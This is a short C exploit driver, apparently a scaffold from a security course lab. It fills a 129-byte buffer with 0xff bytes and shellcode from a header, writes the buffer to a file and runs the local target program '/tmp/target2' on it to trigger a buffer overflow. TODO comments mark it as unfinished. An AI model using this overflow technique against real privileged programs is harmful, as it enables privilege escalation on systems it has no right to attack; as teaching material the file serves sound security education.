#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target2"
#define DEFAULT_OUTPUT "/tmp/xploit2_output"

int main(int argc, char *argv[])
{
  // TODO determine size of exploit
  char exploit[128 + 1];

  // TODO fill exploit buffer
  memset(exploit, '\xff', sizeof(exploit));
  memcpy(exploit, shellcode, sizeof(shellcode) - 1);
  *(exploit + 128) = 0x00;

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
